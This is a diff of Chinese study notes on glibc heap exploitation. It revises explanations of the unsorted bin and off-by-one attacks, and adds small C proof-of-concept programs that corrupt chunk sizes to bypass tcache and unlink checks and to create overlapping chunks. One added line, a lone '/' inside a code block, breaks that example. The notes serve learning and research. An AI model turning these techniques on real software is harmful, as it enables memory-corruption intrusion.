@@ -141,7 +141,7 @@ mfastbinptr fastbinsY[];
 - **当free大小不在fastbin，为了效率，先放入到unsorted bin**，一段时间后(下次malloc 且没找到合适的chunk)再放入对应的bin中，因此 free的时间复杂度是O(1),malloc是O(N).
 - 当一个较大的 chunk 被分割成两半(来源large bin）后（bin中没有合适的chunk），如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
 - 下次malloc先找unsorted bin中是否有适合的chunk.
-- unsorted bin 取出的时不会检查size
+- unsorted bin 取出的时不会检查size,但放入时会检查下一个chunk的prev_inuse的位置判断是否发生的double free
 
 验证：
 - size不符合不会放入unsorted bin
@@ -888,7 +888,7 @@ off by one 是与size相关的攻击。
 1. 减小释放后chunk的size
 
 ![[shrink chunk.png]]
-下面是示例加大了b绕过tcache
+下面是示例加大了b的size是为了绕过tcache
 ```c
 #include<stdlib.h>
 #include<stdio.h>
@@ -899,6 +899,7 @@ int main(int argc, char const *argv[])
     char *a=malloc(0x108);
     char *b=malloc(0x500);
     char *c=malloc(0x500);
+    // -----------------------------------------------------------
     //bypss malloc b1 -> unlink check
     *(size_t *)(b+0x4f0)=0x500;
     free(b);
@@ -911,7 +912,7 @@ int main(int argc, char const *argv[])
     strcpy(b2,"please change me!");
     free(b1);
     free(c);
-    
+    /
     char *evil=malloc(0x500);
     printf("b2:%s\n",b2);
     strcpy(evil+0x420,"hahahahahahaha");
@@ -919,7 +920,7 @@ int main(int argc, char const *argv[])
     return 0;
 }
 ```
-2. 增加释放后chunk的size
+2. 增加释放后chunk的size，使用unlink
 增加释放后的chunk size，伪造的prev_size就在chunk c中了。其余不变。
 ```c
 #include<stdlib.h>
@@ -931,9 +932,12 @@ int main(int argc, char const *argv[])
     char *a=malloc(0x108);
     char *b=malloc(0x500);
     char *c=malloc(0x500);
+    //------------------------------------------------
     *(size_t *)c=0x520;
     free(b);
+
     // overflow to b->size
+    
     *(a+0x108)=0x20;
     char *b1=malloc(0x410);
     // bypass free(c) -> unlink check
@@ -942,7 +946,7 @@ int main(int argc, char const *argv[])
     strcpy(b2,"please change me!");
     free(b1);
     free(c);
-    
+    // ---------------------------------------------------
     char *evil=malloc(0x500);
     printf("b2:%s\n",b2);
     strcpy(evil+0x420,"hahahahahahaha");
@@ -950,7 +954,31 @@ int main(int argc, char const *argv[])
     return 0;
 }
 ```
-3. 减小使用中chunksize，覆盖了prev_inuse导致向前合并
+2. 增加释放后的chunk size 使用first fit
+```c
+#include<stdlib.h>
+#include<stdio.h>
+#include<string.h>
+int main(int argc, char const *argv[])
+{
+    printf("off by one in glibc <2.39\n");
+    char *a=malloc(0x108);
+    char *b=malloc(0x500);
+    char *c=malloc(0x500);
+    strcpy(c,"please change me!");
+    // ------------------------------------------------------------------
+    free(b);
+    // of by one
+    *(a+0x108)=0x31;
+    // -------------------------------------------------------------
+    char *evil=malloc(0x528);
+
+    strcpy(evil+0x510,"hahahahahahaha");
+    printf("c:%s\n",c);
+    return 0;
+}
+```
+4. 减小使用中chunksize，覆盖了prev_inuse导致向前合并
 ```c
 #include<stdlib.h>
 #include<stdio.h>
